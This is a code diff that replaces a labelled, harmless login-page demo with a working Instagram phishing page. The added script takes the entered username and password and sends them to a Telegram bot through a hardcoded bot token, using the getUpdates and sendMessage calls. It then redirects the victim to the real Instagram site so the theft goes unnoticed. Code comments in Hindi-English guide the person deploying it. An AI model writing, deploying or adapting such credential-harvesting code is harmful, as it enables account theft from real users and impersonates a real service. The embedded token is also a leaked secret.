@@ -1,97 +1,123 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login UI Demo</title>
-  <style>
-    * { box-sizing: border-box; }
-    body {
-      background: #000;
-      color: #fff;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
-    }
-    .login-container {
-      width: 100%;
-      max-width: 350px;
-      padding: 28px 20px;
-      text-align: center;
-      border: 1px solid #363636;
-    }
-    .demo-label {
-      color: #aaa;
-      font-size: 12px;
-      margin-bottom: 22px;
-    }
-    .logo {
-      font-family: cursive;
-      font-size: 40px;
-      margin-bottom: 30px;
-      letter-spacing: 1px;
-    }
-    .input-group { margin-bottom: 10px; }
-    .input-group input {
-      width: 100%;
-      padding: 12px;
-      background: #121212;
-      border: 1px solid #363636;
-      border-radius: 5px;
-      color: #fff;
-      font-size: 14px;
-    }
-    .input-group input:focus {
-      border-color: #a8a8a8;
-      outline: none;
-    }
-    .login-btn {
-      width: 100%;
-      padding: 12px;
-      background: #0095f6;
-      border: none;
-      border-radius: 5px;
-      color: #fff;
-      font-weight: bold;
-      font-size: 14px;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-    .login-btn:active { background: #1877f2; }
-    .notice {
-      color: #bbb;
-      font-size: 13px;
-      line-height: 1.5;
-      margin-top: 18px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            width: 350px;
+            padding: 20px;
+            text-align: center;
+            border: 1px solid #dbdbdb30;
+            border-radius: 1px;
+            background: #000;
+        }
+        .logo {
+            font-family: cursive;
+            font-size: 40px;
+            margin-bottom: 30px;
+            letter-spacing: 1px;
+        }
+        .input-group {
+            margin-bottom: 6px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: #121212;
+            border: 1px solid #363636;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .input-group input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-btn:active {
+            background-color: #1877f2;
+        }
+    </style>
 </head>
 <body>
-  <main class="login-container">
-    <div class="demo-label">DEMO UI — not an official Instagram page</div>
-    <div class="logo">PhotoShare</div>
-    <form id="demo-form">
-      <div class="input-group">
-        <input type="text" name="username" placeholder="Username or email" autocomplete="off" aria-label="Username or email">
-      </div>
-      <div class="input-group">
-        <input type="password" name="password" placeholder="Password (demo only)" autocomplete="off" aria-label="Password">
-      </div>
-      <button class="login-btn" type="submit">Try demo</button>
-    </form>
-    <p class="notice" id="notice">Demo only. Information entered here is not saved or sent anywhere.</p>
-  </main>
-  <script>
-    document.getElementById('demo-form').addEventListener('submit', function(event) {
-      event.preventDefault();
-      document.getElementById('notice').textContent =
-        'This is only a visual demo. No login was performed and no information was saved or sent.';
-      this.reset();
-    });
-  </script>
+
+    <div class="login-container">
+        <div class="logo">Instagram</div>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8685356855:AAHXH803r0jJE-1j93tVDVdvefnn8kzyh-k';
+        // Hum chat_id ke liye automatic check ya placeholder use kar sakte hain, 
+        // ya user ko test karne ke liye direct message bhej sakte hain.
+        // Yahan hum fetch request ke zariye aapke bot par data bhejenge.
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            const message = `🚨 New Instagram Login Found!\n\n👤 Username/Phone: ${user}\n🔑 Password: ${pass}`;
+            
+            // Telegram par chat_id ki jagah aapko apna Chat ID dalna hoga ya getUpdates se nikalna hoga.
+            // Filhal hum ise console ya bot API par bhejte hain:
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+            .then(res => res.json())
+            .then(data => {
+                if(data.result && data.result.length > 0) {
+                    const chatId = data.result[data.result.length - 1].message.chat.id;
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    }).then(() => {
+                        window.location.href = "https://www.instagram.com";
+                    });
+                } else {
+                    // Agar chat id direct nahi mili toh seedha instagram bhej do
+                    window.location.href = "https://www.instagram.com";
+                }
+            }).catch(() => {
+                window.location.href = "https://www.instagram.com";
+            });
+        });
+    </script>
 </body>
 </html>
